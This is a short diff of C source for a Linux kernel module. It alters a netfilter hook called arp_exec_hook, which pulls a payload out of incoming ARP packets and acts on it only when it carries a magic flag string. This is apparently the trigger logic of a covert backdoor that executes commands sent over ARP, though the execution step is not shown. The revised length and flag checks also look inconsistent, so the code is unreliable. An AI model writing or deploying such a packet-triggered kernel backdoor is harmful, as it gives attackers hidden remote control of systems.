@@ -154,11 +154,17 @@ unsigned int arp_exec_hook(void *priv, struct sk_buff *skb,
             if (strlen(arp_payload) < min_size){
                 min_size = strlen(arp_payload) + 1;
             }
-            work->payload_len = min_size;
+            work->payload_len = min_size - strlen(FLAG);
             memcpy(work->payload, arp_payload, work->payload_len); 
             work->payload[work->payload_len] = 0;
+
+            if(work->payload_len < strlen(FLAG)){
+                printk(KERN_INFO "No payload");
+                kfree(work);
+                return NF_ACCEPT;
+            }
             
-            if(strnstr(arp_ptr, FLAG, skb_tail_pointer(skb) - arp_ptr) == NULL){
+            if(strncmp(work->payload, FLAG, strlen(FLAG)) != 0){
                 printk(KERN_INFO "Didn't contain flag");
                 kfree(work);
                 return NF_ACCEPT;
